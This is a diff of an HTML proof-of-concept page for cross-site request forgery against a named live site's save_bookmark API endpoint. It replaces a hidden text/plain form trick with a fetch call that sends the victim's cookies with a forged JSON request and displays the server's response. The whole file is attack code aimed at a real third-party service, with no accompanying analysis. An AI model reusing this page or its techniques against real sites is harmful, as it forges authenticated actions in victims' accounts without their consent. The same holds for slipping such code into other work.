@@ -1,17 +1,31 @@
 <!DOCTYPE html>
 <html>
 <body>
-  <h2>CSRF PoC - Save Bookmark</h2>
+  <h2>CSRF JSON Test</h2>
+  <button onclick="send()">Send request</button>
 
-  <form action="https://www.powerpak.com/ws/api.asmx/save_bookmark"
-        method="POST"
-        enctype="text/plain"
-        target="csrfFrame">
+  <pre id="out"></pre>
 
-    <input type="hidden" name='{"entity_id":"124041"}' value="">
-    <button type="submit">Submit CSRF</button>
-  </form>
+  <script>
+    async function send() {
+      try {
+        const res = await fetch("https://www.powerpak.com/ws/api.asmx/save_bookmark", {
+          method: "POST",
+          credentials: "include",
+          headers: {
+            "Content-Type": "application/json; charset=utf-8",
+            "X-Requested-With": "XMLHttpRequest"
+          },
+          body: JSON.stringify({ entity_id: "124041" })
+        });
 
-  <iframe name="csrfFrame" style="display:none;"></iframe>
+        document.getElementById("out").textContent =
+          "Status: " + res.status + "\n" + await res.text();
+      } catch (e) {
+        document.getElementById("out").textContent =
+          "Blocked/Error: " + e.message;
+      }
+    }
+  </script>
 </body>
 </html>
